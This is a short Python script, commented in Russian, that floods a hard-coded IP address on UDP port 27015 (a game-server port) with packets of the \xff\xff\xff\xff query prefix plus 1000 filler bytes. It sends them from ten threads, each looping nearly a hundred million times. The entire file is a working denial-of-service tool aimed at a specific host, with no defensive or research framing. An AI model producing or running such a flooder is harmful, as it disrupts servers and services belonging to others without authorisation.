import socket
import threading

# Настройки сервера
server_ip = "151.106.5.230"
server_port = 27015

# Данные для отправки
data = b"\xff\xff\xff\xff" + b"A" * 1000
num_requests = 99999999  # Количество запросов

# Функция отправки запросов
def send_requests():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        for _ in range(num_requests):
            sock.sendto(data, (server_ip, server_port))
    finally:
        sock.close()

# Количество потоков
num_threads = 10

# Создание и запуск потоков
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(thread)

# Ожидание завершения всех потоков
for thread in threads:
    thread.join()

print(f"Все запросы отправлены на сервер {server_ip}:{server_port}.")
